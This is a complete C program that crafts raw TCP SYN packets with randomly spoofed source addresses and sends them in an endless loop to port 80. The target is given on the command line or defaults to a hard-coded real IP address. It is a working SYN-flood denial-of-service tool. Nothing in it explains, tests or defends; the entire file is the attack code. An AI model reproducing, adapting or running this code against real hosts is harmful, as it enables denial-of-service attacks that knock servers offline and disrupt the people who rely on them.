#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include <stdint.h>
typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

struct pseudo_header
{
    u32 source_address;
    u32 dest_address;
    u8 placeholder;
    u8 protocol;
    u16 tcp_length;

    struct tcphdr tcp;
};

u16 checksum(u16 *ptr, u32 nbytes) {
    u64 sum = 0;

    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) {
        sum += *(u8*)ptr;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (u16)~sum;
}

const u8* construct_packet(in_addr_t saddr, in_addr_t daddr) {
    #define PKT_LEN 4096
    static u8 pkt[PKT_LEN];

    //IP header
    struct iphdr *iph = (struct iphdr *) pkt;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (pkt + sizeof (struct ip));
    //Pseudo header
    struct pseudo_header psh;

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(37654);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = saddr;
    iph->daddr = daddr;
    iph->check = 0; // ip header checksum may be ignored

    //TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = (u32)random();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(1000);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    //Fill in the Pseudo Header
    psh.source_address = saddr;
    psh.dest_address = daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
    memcpy(&psh.tcp, tcph, sizeof (struct tcphdr));
    tcph->check = checksum((u16*)&psh, sizeof(struct pseudo_header));
    return pkt;
}

int main(int argc, char *argv[]) {

    in_addr_t daddr = 0;

    if (argc > 1) {
        printf("Dest addr: %s\n", argv[1]);
        daddr = inet_addr(argv[1]);
    } else {
        puts("Dest addr: 202.38.64.1");
        daddr = inet_addr("202.38.64.1");
    }

    srandom((u32)time(NULL));
    in_addr_t saddr = htonl((u32)random());

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = daddr;

    u16 tot_len = sizeof(struct ip) + sizeof(struct tcphdr);

    const u8* pkt = NULL;

    i32 s = 0;
    i8 on = 1;

    for (;;) {

        s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL,
            (i8*)&on, sizeof(on)) == -1)
        {
            printf("[setsockopt] can't set IP_HDRINCL option\n");
        }
        pkt = construct_packet(saddr, daddr);

        //Send the packet
        if (sendto(s, pkt, tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            // Not a fatal error
        }

        saddr = htonl((u32)random());
        close(s);
    }

    return 0;
}
